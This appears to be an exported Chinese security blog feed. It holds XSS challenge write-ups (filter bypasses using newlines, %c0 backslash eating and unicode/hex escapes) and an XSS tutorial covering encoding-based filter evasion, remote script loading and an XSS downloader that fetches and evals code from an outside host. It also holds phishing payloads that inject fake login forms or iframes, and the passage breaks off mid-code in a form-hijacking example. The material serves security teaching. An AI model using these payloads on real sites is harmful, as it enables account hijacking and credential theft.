plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location.href=&quot;.........&quot;+&quot;&amp;ss=aaaa\&quot;+&quot;&amp;from==1;function from()&#123;&#125;//&quot;+&quot;&amp;param=&quot;;</span><br></pre></td></tr></table></figure><p>这样一来，我们的 function from(){} 就会被提前解析，从而定义了from, 后面 from&#x3D;&#x3D;1的时候，就不会报错.<br>但问题又来了，我们现在添加了许多东西，而添加的这些东西，包含了许多特殊字符，会不会通过呢，经过实际测试，空格符被转义了。<br>空格符被转义了怎么办呢，我们找到新的替换品，那就是&#x2F;**&#x2F;, 这是一个注释符，之前我们也测试过了，斜杠不会被过滤，那么这个注释符，成功的顶替了空格，形成了正常的语法。<br>故最终payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://mail.qq.com/cgi-bin/login?vt=passport&amp;ss=\&amp;from==0;alert(1);function/**/from()&#123;&#125;;//&amp;delegate_url=%2Fcgi-bin%2Fframe_html%3Furl%3D%25252Fcgi-bin%25252Fsetting10%25253Faction%25253Dlist%252526t%25253Dsetting10%252526ss%25253Dindex%252526Mtype%25253D1%252526clickpos%25253D20%252526loc%25253Ddelegate%25252Cwebmap%25252C%25252C1</span><br></pre></td></tr></table></figure><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p>1.&#x3D;&#x3D;的优先级比 &amp; 高，所以语句相当于 (“字符串”)&amp;(from&#x3D;&#x3D;1)<br>2.from未定义，直接和1进行相等判断的话，会报错，错误是：“from”未定义</p><p>3.javascript里有一个特性:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">aaa();</span><br><span class="line">function aaa()&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>凡是以 function xxx(){} 形式定义的函数，都会被最优先解析。换句话说：<br>解析器在解析JS代码段时，会先将 function xxx(){} 拿到最前面解析，然后再依次解析其它的部分。 换句话说，上面的代码，实际的解析顺序是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function aaa()&#123;</span><br><span class="line">&#125;</span><br><span class="line">aaa();</span><br></pre></td></tr></table></figure><p>这便是隐藏在payload中的知识点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location.href=&quot;.........&quot;+&quot;&amp;ss=aaaa\&quot;+&quot;&amp;from==1;alert(1);function/**/from()&#123;&#125;//&quot;+&quot;&amp;param=&quot;;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function from()</span><br><span class="line">&#123;</span><br><span class="line">aaaaa from == 1;</span><br><span class="line">alert(1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="-7"><a href="#-7" class="headerlink" title="&lt;6&gt;"></a>&lt;6&gt;</h2><p><a href="http://xsst.sinaapp.com/xss/ext/6.php?libid=178&FilterAttrAND=3602&FilterValueAND=dota">点击进入本例模拟环境</a></p><h3 id="测试-5"><a href="#测试-5" class="headerlink" title="测试"></a>测试</h3><p>用了几个常用符<br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-bfbeaa7cebfc8c17.png" alt="图片.png"><br>我们在一些注释的代码中也能发现我们的符号们，不难发现被过滤的和没被过滤的<br>那么我们需要思考，如果我们能让代码跳出注释范围，再利用alert(1)触发XSS，这样不就达到我们的目的了吗？</p><h3 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h3><p>所以这里需要再科普一下<strong>换行符%0a</strong><br>现在在view source里先构造我们的payload，观察有没有什么变化，<br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-f312b43cf3d6e7d1.png" alt="图片.png"><br>不难发现我们已经成功跳出注释圈，成功的触发XSS，不过这里也要注意，为了闭合后面的”,由于双引号被过滤，所以我们只能将它注释掉。<br>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%0aalert(1);//</span><br></pre></td></tr></table></figure><h2 id="-8"><a href="#-8" class="headerlink" title="&lt;7&gt;"></a>&lt;7&gt;</h2><p><a href="http://xsst.sinaapp.com/xss/ext/7.php?mod=search&type=data&site=digi&libid=2&curpage=1&pagenum=30&filterattr=138,138%7C16%7C4,5,4,5&filtervalue=3500-4000,%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD4000%7C%EF%BF%BD%EF%BF%BD%D7%AA%7CWCDMA,WCDMA,HSDPA,HSDPA&tplname=centersearch.shtml&orderby=price">点击进入本例模拟环境</a></p><h3 id="测试-6"><a href="#测试-6" class="headerlink" title="测试"></a>测试</h3><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-98c28d1beb111eb3.png" alt="图片.png"><br>简单的测试，能找到被过滤的符号</p><h3 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h3><p>通过审计我们发现，这与上一道题相似，需要跳出注释圈</p><h3 id="解题-2"><a href="#解题-2" class="headerlink" title="解题"></a>解题</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaa%5c%0aalert(1);//</span><br></pre></td></tr></table></figure><p>发现不太行，源码里多了一个\，也就是这里防\，所以我们需要吃掉\</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaa%c0%5c%0aalert(1);//</span><br></pre></td></tr></table></figure><h3 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h3><p>javascript，字符串允许下面多行的写法。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var  a=&quot;我是一个字符串\</span><br><span class="line"></span><br><span class="line">我还是一个字符串&quot;;</span><br><span class="line"></span><br><span class="line">alert(a);</span><br></pre></td></tr></table></figure><p>基于这点，把缺陷点构造成下面的样子。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//document.getElementById(&quot;order_select&quot;).value = &quot;aaaa\</span><br><span class="line">alert(1);//&quot;;</span><br><span class="line"></span><br><span class="line"> var searchOrder = &quot;aaaa\</span><br><span class="line"></span><br><span class="line">alert(1);//&quot;;</span><br></pre></td></tr></table></figure><p>也就是用到换行符 %0a<br>反斜杠问题中%c0可以吃掉%5c<br>%5c就是\</p><h2 id="-9"><a href="#-9" class="headerlink" title="&lt;8.1&gt;"></a>&lt;8.1&gt;</h2><p><a href="http://xsst.sinaapp.com/xss/ext/8.1.php">点击进入本例模拟环境 8.1</a></p><h3 id="测试-7"><a href="#测试-7" class="headerlink" title="测试"></a>测试</h3><p>测试之后我们发现过滤情况和之前差不多。<br>在js中的字符串中的字符可以写为 unicode编码。<br>故我们将&lt;&gt;进行编码，&lt; 可以表示为 \u003c , &gt; 可以表示为 \u003e</p><h3 id="解题-3"><a href="#解题-3" class="headerlink" title="解题"></a>解题</h3><figure class="highlight plaintext"><figcaption><span>src</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">```\u003cimg src=1\u003e``` 再次尝试 ，发现页面出现反应了，利用这个漏洞</span><br><span class="line">```\u003cimg src=1 onerror=alert(1)\u003e```</span><br><span class="line"></span><br><span class="line">## &lt;8.2&gt;</span><br><span class="line"></span><br><span class="line">[点击进入本例模拟环境 8.2](http://xsst.sinaapp.com/xss/ext/8.2.php?libid=1&amp;keyvalue=DK&amp;attr=133&amp;stype=2&amp;tname=star_second.shtml)</span><br><span class="line"></span><br><span class="line">#### 测试</span><br><span class="line"></span><br><span class="line">经过简单的测试发现它和上一道题基本类似</span><br><span class="line"></span><br><span class="line">### 解题</span><br><span class="line"></span><br><span class="line">那我们就开始大胆的解题了，尝试用上一道题的方法</span><br><span class="line">![图片.png](https://upload-images.jianshu.io/upload_images/14443259-75c9ab5d54eb44ea.png?imageMogr2/auto-orient/strip|imageView2/2/w/1240)</span><br><span class="line">很遗憾，很不幸，很失望，我们发现unicode编码&lt;&gt;也被过滤了</span><br><span class="line">在JS字符串里， &lt; 不光可以写为 \u003c，还可以写为 \x3c， &gt; 同样可以写为 \x3e。</span><br><span class="line">我们再试试这个，出现弹窗。故，</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>\x3cimg src&#x3D;1 onerror&#x3D;alert(1)\x3e</p><pre><code>### 修复方案修复方案：方法1. 输出时，过滤 \方法2. innerHTML=encodeHTML([输出])</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Vulnerabilities </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS Cross-Site Attacks</title>
      <link href="/2019/03/09/XSS-Cross-Site-Attacks/"/>
      <url>/2019/03/09/XSS-Cross-Site-Attacks/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是XSS？"><a href="#什么是XSS？" class="headerlink" title="什么是XSS？"></a>什么是XSS？</h2><blockquote><p>跨站脚本（Cross-Site Scripting，XSS）是一种经常出现在 Web 应用程序中的计算机安全漏 洞，是由于 Web 应用程序对用户的输入过滤不足而产生的。攻击者利用网站漏洞把恶意的脚本 代码（通常包括 HTML 代码和客户端 Javascript 脚本）注入到网页之中，当其他用户浏览这些网 页时，就会执行其中的恶意代码，对受害用户可能采取 Cookie 资料窃取、会话劫持、钓鱼欺骗 等各种攻击。<br>由于和另一种网页技术——层叠样式表（Cascading Style Sheets，CSS）的缩写一样，为了防 止混淆，故把原本的 CSS 简称为 XSS。 通常情况下，我们既可以把跨站脚本理解成一种 Web 安全漏洞，也可以理解成一种攻击手段。</p></blockquote><h2 id="XSS攻击流程"><a href="#XSS攻击流程" class="headerlink" title="XSS攻击流程"></a>XSS攻击流程</h2><p>XSS 跨站脚本攻击本身对 Web 服务器没有直接危害，它借助网站进行传播，使网站的大量用户 受到攻击。攻击者一般通过留言、电子邮件或其他途径向受害者发送一个精心构造的恶意 URL，当 受害者在 Web 浏览器中打开该 URL 的时侯，恶意脚本会在受害者的计算机上悄悄执行，流程如图</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-29b5a9403ba7cce6.png" alt="图片.png"></p><h2 id="XSS-漏洞的危害"><a href="#XSS-漏洞的危害" class="headerlink" title="XSS 漏洞的危害"></a>XSS 漏洞的危害</h2><blockquote><p>（1）网络钓鱼，包括盗取各类用户账号；<br>（2）窃取用户 cookies 资料，从而获取用户隐私信息，或利用用户身份进一步对网站执行操 作；<br>（3）劫持用户（浏览器）会话，从而执行任意操作，例如进行非法转账、强制发表日志、发 送电子邮件等；<br>（4）强制弹出广告页面、刷流量等；<br>（5）网页挂马；<br>（6）进行恶意操作，例如任意篡改页面信息、删除文章等；<br>（7）进行大量的客户端攻击，如 DDoS 攻击；<br>（8）获取客户端信息，例如用户的浏览历史、真实 IP、开放端口等；<br>（9）控制受害者机器向其他网站发起攻击；<br>（10）结合其他漏洞，如 CSRF 漏洞，实施进一步作恶；<br>（11）提升用户权限，包括进一步渗透网站；<br>（12）传播跨站脚本蠕虫等；<br>##XSS攻击之利用字符编码<br>HTML 标签中的某些属性值可以使用&amp;#ASCII 方式进行编码改写，这种 XSS 转码支持十进制和十六进制形式。</p></blockquote><p>1.工具转码:使用在线工具将输入内容转码<br>2.函数转码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">在 <span class="title class_">JavaScript</span> 中有一个 <span class="built_in">eval</span>()函数，该函数可计算字符串，并执行其中的 <span class="title class_">JavaScript</span></span><br><span class="line">代码，如下所示： </span><br><span class="line">&lt;script&gt; <span class="built_in">eval</span>(<span class="string">&quot;alert(&#x27;XSS&#x27;)&quot;</span>); &lt;/script&gt; </span><br><span class="line">我们可以使用\连接十六进制字符串，然后使用 <span class="built_in">eval</span>()函数执行十六进制字符串形式的脚本， 如对 <span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)进行十六进制转码后得到： </span><br><span class="line">\<span class="number">61</span>\6c\<span class="number">65</span>\<span class="number">72</span>\<span class="number">74</span>\<span class="number">28</span>\<span class="number">27</span>\<span class="number">58</span>\<span class="number">53</span>\<span class="number">53</span>\<span class="number">27</span>\<span class="number">29</span> </span><br></pre></td></tr></table></figure><p>完整如下：<br><code>&lt;script&gt; eval(&quot;\x61\x6c\x65\x72\x74\x28\x27\x58\x53\x53\x27\x29&quot;); &lt;/script&gt;</code><br>3.函数结合转码:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">string.<span class="title function_">formcharcode</span>()用于将字符转为 <span class="variable constant_">ASCII</span> 值</span><br><span class="line">结合使用 <span class="built_in">eval</span>()和 <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>()函数后变成： </span><br><span class="line">&lt;embed src=<span class="string">&quot;javascript:eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))&quot;</span>&gt; </span><br></pre></td></tr></table></figure><p>4.样式表转码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">可以对 background 的属性值进行十六进制字符串形式转换： </span><br><span class="line">&lt;style&gt; </span><br><span class="line"><span class="variable constant_">BODY</span> &#123; </span><br><span class="line"><span class="attr">background</span>: \<span class="number">75</span>\<span class="number">72</span>\6c\<span class="number">28</span>\<span class="number">68</span>\<span class="number">74</span>\<span class="number">74</span>\<span class="number">70</span>\3a\2f\2f\<span class="number">31</span>\<span class="number">32</span>\<span class="number">37</span>\2e\<span class="number">30</span>\2e\<span class="number">30</span>\2e\<span class="number">31</span>\2f\<span class="number">78</span>\<span class="number">73</span>\<span class="number">73</span>\2e\<span class="number">67</span>\<span class="number">69</span>\<span class="number">6</span> <span class="number">6</span>\<span class="number">29</span> &#125; </span><br><span class="line">&lt;/style&gt; </span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;xss:<span class="symbol">&amp;#101;</span><span class="symbol">&amp;#120;</span><span class="symbol">&amp;#112;</span><span class="symbol">&amp;#114;</span><span class="symbol">&amp;#101;</span><span class="symbol">&amp;#115;</span><span class="symbol">&amp;#115;</span><span class="symbol">&amp;#105;</span><span class="symbol">&amp;#111;</span><span class="symbol">&amp;#110;</span>(alert(1));&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span> </span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">DIV</span> <span class="attr">STYLE</span>=<span class="string">&quot;background-image:\0075\0072\006C\0028\006A\0061\0076\0061\0073\0063\0072\ 0069\0070\0074\003A\0061\006C\0065\0072\0074\0028\0027\0058\0053\0053\0027\0029\002 9&quot;</span>&gt;</span></span></span><br></pre></td></tr></table></figure><blockquote><p>style 属性中的 javascript、expression 等字符一般会被程序过滤，但经过十六进制编码后则可 以逃避过滤</p></blockquote><p>5.JScript Encode 和 VBScript Encode<br>脚本加密的两种形式:JScript 和 VBScript.<br>经过加密的脚本，能在 IE下正常运行，在其他浏览器下则不识别。<br>如 **alert(1)**使用 JScript Encode 加密的结果为：<br><code>#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@</code><br>经 XSS Expliot 后变为：<br><code>&lt;script language=&quot;JScript.Encode&quot;&gt; #@~^CAAAAA==C^+.D`8#mgIAAA==^#~@ &lt;/script&gt;</code><br> VBScript.Encode :</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=# language=<span class="string">&quot;JScript.Encode&quot;</span>  onclick=<span class="string">&quot;#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@&quot;</span>&gt;test&lt;/a&gt; </span><br><span class="line">&lt;iframe onload=JScript.Encode:#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@&gt;</span><br><span class="line"> &lt;iframe onload=VBScript.Encode:#@~^CAAAAA==\ko$K6,FoQIAAA==^#~@&gt;</span><br><span class="line"> &lt;iframe onload=VBScript&amp;#46;Encode:#@~^CAAAAA==\ko$K6,FoQIAAA==^#~@&gt; </span><br></pre></td></tr></table></figure><p><strong>复杂的</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div style=<span class="string">&quot;\000000000000000000000078\000000000000000000000073s:e&amp;#x5c;&amp;#x78;p&amp;#47;&amp;#42;&amp;#106;&amp;#110;&amp;#118;&amp;#42;&amp;#47;\0072\0065ssion(window.x?0:(alert(/XSS/),window.x= 1));&quot;</span>&gt;&lt;/div&gt; </span><br></pre></td></tr></table></figure><h2 id="Shellcode"><a href="#Shellcode" class="headerlink" title="Shellcode"></a>Shellcode</h2><p> 所谓的 Shellcode，最初是溢出程序和蠕虫病毒的核心，实际上是指利用一个漏洞时所执行 的代码。在 XSS 跨站脚本中，是指由 JavaScript 等脚本编写的 XSS 利用代码。</p><blockquote><p>【Exploit】<br>Exploit 的英文意思就是利用，在黑客眼里就是漏洞利用，通常表示完整编写好的漏洞利用 工具（或程序），具有一定的攻击性。 Exploit 很容易和 Shellcode 混淆，所以需要记住一点：Exploit 往往包含了 Shellcode。<br>【POC】<br>即 Proof of Concept 的缩写，是一段证明漏洞存在的程序代码片段。</p></blockquote><p>在传统 XSS 的运用中，Shellcode 一般是直接写进页面中执行，不过实际环境中可能会遇到 重重阻挠，比如服务器端程序的过滤、输入字符有长度限制等，所以，攻击者往往会把 Shellcode 写到远程服务器上，然后使用<script>等标签对其进行调用，或者使用一些本地存储对象对其进 行存储和调用等。<br> 在 XSS 中调用 Shellcode 有多种方式。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. 动态调用远程 JavaScript</span><br><span class="line">2.使用 window.location.hash</span><br><span class="line">3. XSS Downloader </span><br></pre></td></tr></table></figure><h3 id="一"><a href="#一" class="headerlink" title="一"></a>一</h3><p>payload: <script src="http://localhost/XSS.js"></script></p><h4 id="脚本：动态调用"><a href="#脚本：动态调用" class="headerlink" title="脚本：动态调用"></a>脚本：动态调用</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var s=document.createElement(&quot;script&quot;);</span><br><span class="line">s.src=&quot;http://localhost/XSS.js&quot;;</span><br><span class="line">document.getElementsByTagName(&quot;head&quot;)[0].appendChild(s);</span><br></pre></td></tr></table></figure><p>第一行代码使用 createElement()函数创建一个新元素——script。<br>第二行代码把<script>的 src 属性设置成 “http://...”， xss.js 里面写有 Shellcode 代码。<br>第三行代码使用 getElementsByTagName()函数查找并返回文档中第一个元素（因为索引为 0）， 然后利用 appendChild()函数调用元素参数 s，追加指定的节点到子节点列表的最后一个。<br>简单 来说 ，这 段 脚本 的作 用就 是 动态 创建 了一 个<script>标 签 ，其 src 属性 指向 http://...，然后把引用 JavaScript 的代码插入到网页的<head>标签后。</p><h3 id="二"><a href="#二" class="headerlink" title="二"></a>二</h3><p>payload:localhost/XSS/test.php?sort=<script>eval(location.hash.substr(1))</script>#alert(‘xss’)</p><blockquote><p>substr()可在字符串中抽取从 start 下标（这里是 1）开始的指定数目的字符，所以 location.hash.substr(1) 的作用是抽取“#”符号后面的字符，即 alert(‘xss’)<br>eval()函数用来计算 某个字符串，并执行其中的 JavaScript 代码<br>eval(location.hash.substr(1))的功能就是执行 Url的#之后的 JavaScript 代码，<br>通过这个技巧，就能先把 Shellcode 写到地址参数中再执行</p></blockquote><h3 id="三"><a href="#三" class="headerlink" title="三"></a>三</h3><p>XSS Downloader:<br>将其存储到网站的数据库中，包括网 页信息、文章内容、个人资料等地方，然后再把它们下载下来执行。<br>简单地说，其实就是打造一个 XSS downloader（XSS 下载器），事先把 Shellcode 写在网站 的某个页面，再利用 XMLHTTP 控件向网站发送 HTTP 请求（POST 或 GET），然后执行返回的 数据。</p><p><strong>POC复现：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">XSS</span>(<span class="params"></span>)&#123; </span><br><span class="line">a=<span class="keyword">new</span> <span class="title class_">ActiveXObject</span>(<span class="string">&#x27;Microsoft.XMLHTTP&#x27;</span>);  </span><br><span class="line">a.<span class="title class_">Open</span>(<span class="string">&#x27;get&#x27;</span>,<span class="string">&#x27;http://www.bug.com/11221.html&#x27;</span>,<span class="literal">false</span>);/ </span><br><span class="line">a.<span class="title function_">send</span>(); </span><br><span class="line">b=a.<span class="property">responseText</span>;  </span><br><span class="line"><span class="built_in">eval</span>(<span class="built_in">unescape</span>(b.<span class="title function_">substring</span>(b.<span class="title function_">indexOf</span>(<span class="string">&#x27;BOF|&#x27;</span>)+<span class="number">4</span>,b.<span class="title function_">indexOf</span>(<span class="string">&#x27;|EOF&#x27;</span>))));</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">XSS</span>();  </span><br></pre></td></tr></table></figure><p>第一行：定义一个 XSS()函数，该函数也就是调用 Shellcode 的主函数。<br>第二行：创建一个 XMLHTTP 对象。<br>第三、四行：向 <a href="http://www.bug.com/11221.html">http://www.bug.com/11221.html</a> 发送一个 HTTP 请求并获取 HTTP 响应。<br>第五行：获取 responseText，结果返回为字符串，把该变量赋值给 b 变量。<br>第六行：用 indexOf()函数计算 BOF|和|EOF 的位置，再用 substring()函数方法取出字符串， 最后用 unescape()函数方法解码执行。</p><h2 id="XSS钓鱼方式"><a href="#XSS钓鱼方式" class="headerlink" title="XSS钓鱼方式"></a>XSS钓鱼方式</h2><blockquote><p>（1）XSS 重定向钓鱼（XSS Redirect Phishing）<br>（2）HTML注入式钓鱼（XSS HTML Inject Phishing）<br>（3）XSS 跨框架钓鱼（Iframe Phishing）<br>（4）Flash 钓鱼（Flash Phishing）</p></blockquote><h3 id="一-1"><a href="#一-1" class="headerlink" title="一"></a>一</h3><p>payload:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">http</span>:<span class="regexp">/.../i</span>ndex.<span class="property">php</span>?search=<span class="string">&quot;&#x27;&gt;&lt;script&gt;document.location.href=&quot;</span><span class="attr">http</span>:<span class="comment">//...&quot;&lt;/script&gt; </span></span><br></pre></td></tr></table></figure><h3 id="二-1"><a href="#二-1" class="headerlink" title="二"></a>二</h3><p>payload:<br><code>http://www.bug.com/index.php?search=”’&lt;html&gt;&lt;head&gt;&lt;title&gt;login&lt;/title&gt;&lt;/head&gt; &lt;body&gt;&lt;div style=&quot;text-align: center;&quot;&gt;&lt;form Method=&quot;POST&quot; Action=&quot;phishing.php&quot; Name=&quot;form&quot;&gt;&lt;br /&gt;&lt;br/&gt;Login:&lt;br/&gt; &lt;input name=&quot;login&quot; /&gt;&lt;br /&gt;Password:&lt;br/&gt;&lt;input name=&quot;Password&quot; type=&quot;password&quot; /&gt;&lt;br /&gt;&lt;br /&gt;&lt;input name=&quot;Valid&quot; value=&quot;Ok&quot; type=&quot;submit&quot; /&gt;&lt;br /&gt;&lt;/form&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</code></p><p> <strong>这段代码会在正常页面中嵌入一个 Form 表单,该表单可以覆盖 原页面显示，强迫用户输入账号和密码等信息。</strong></p><h3 id="三-1"><a href="#三-1" class="headerlink" title="三"></a>三</h3><p>这种方式是通过<Iframe>标签嵌入远程域的一个页面实施钓鱼<br>新建一个HTMLL文件：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt; </span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span> </span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html;charset=gb2312&quot;</span>&gt;</span> </span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">title</span>&gt;</span>百度一下，你就知道      <span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"> <span class="tag">&lt;<span class="name">body</span> <span class="attr">scroll</span>=<span class="string">&quot;no&quot;</span>&gt;</span> </span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">&quot;myFrame&quot;</span> <span class="attr">src</span>=<span class="string">&quot;http://www.baidu.com&quot;</span> <span class="attr">width</span>=<span class="string">&quot;100%&quot;</span> <span class="attr">height</span>=<span class="string">&quot;100%&quot;</span> <span class="attr">scrolling</span> =<span class="string">&quot;auto&quot;</span> <span class="attr">frameborder</span>=<span class="string">&quot;0&quot;</span> <span class="attr">onload</span>=<span class="string">&quot;this.style.height=document.body.clientHeight&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span> </span></span><br><span class="line"><span class="language-xml"> <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"> <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span> </span><br></pre></td></tr></table></figure><p>上述代码会伪造一个和百度网页类似的网页，<br>payload:<br><code>http://.../index.php?search=&#39;&gt;&lt;iframe src=“http://...” height=&quot;100%&quot; width=&quot;100%&quot;&gt;&lt;/iframe&gt;</code></p><h3 id="四"><a href="#四" class="headerlink" title="四"></a>四</h3><p>Flash 钓鱼甚至不要求网站存在 XSS 漏洞，只要 攻击者把精心构造的 Flash 文件（比如一个假冒的登录框）上传到远程服务器，然后在目标网站 中使用<object>或<embed>标签去引用 Flash 即可。<br>当然，Flash 本身也存在许多的安全漏洞，包括 XSS、CSRF 和跨域等问题，而且 Flash 也有 内置的编程语言——ActionScript。ActionScript 与 JavaScript、服务端编程语言一样都可以作为跨 站攻击的一种辅助手段。</p><h2 id="XSS高级钓鱼技术"><a href="#XSS高级钓鱼技术" class="headerlink" title="XSS高级钓鱼技术"></a>XSS高级钓鱼技术</h2><h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><blockquote><p>黑客利用 XSS 漏洞可以窃取用户会话的 Cookie，从而窃取网站用户的隐私数据，包括 MD5 密码信息等。但是，如果网站使用了 Httponly 的 Cookie（将 Cookie 的属性设置为“Httponly” 就可防止 Cookie被恶意JavaScript脚本存取），或无法通过 Cookie欺骗等方式侵入受害者的账户， 那么窃取用户 Cookie 资料的方法就显得英雄无用武之地。<br>这种情况下，黑客更青睐于直接获取用户的明文账户密码信息。这时候就要用到一些高级的 XSS 钓鱼技术，而构成这些技术的主要元素无非是我们所熟知的 DHTML、JavaScript、Ajax等。</p></blockquote><h3 id="实例一"><a href="#实例一" class="headerlink" title="实例一"></a>实例一</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt; </span><br><span class="line"><span class="title class_">Form</span> = <span class="variable language_">document</span>.<span class="property">forms</span>[<span class="string">&quot;userslogin&quot;</span>];</span><br><span class="line"><span class="title class_">Form</span>.<span class="property">onsubmit</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123; </span><br><span class="line"><span class="keyword">var</span> iframe = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span 